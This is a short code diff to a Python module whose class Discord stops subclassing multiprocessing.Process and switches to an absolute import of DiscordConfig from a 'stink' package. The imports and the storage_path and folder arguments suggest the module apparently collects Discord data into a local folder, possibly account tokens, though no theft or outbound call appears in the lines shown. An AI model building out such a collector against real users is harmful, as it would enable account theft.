@@ -1,17 +1,15 @@
 from re import findall
 from json import loads
 from threading import Thread
-from multiprocessing import Process
 from os import listdir, path, makedirs
 from urllib.request import Request, urlopen
 
-from ..helpers.config import DiscordConfig
+from stink.helpers.config import DiscordConfig
 
 
-class Discord(Process):
+class Discord:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
-        Process.__init__(self)
 
         self.config = DiscordConfig()
         self.storage_path = storage_path
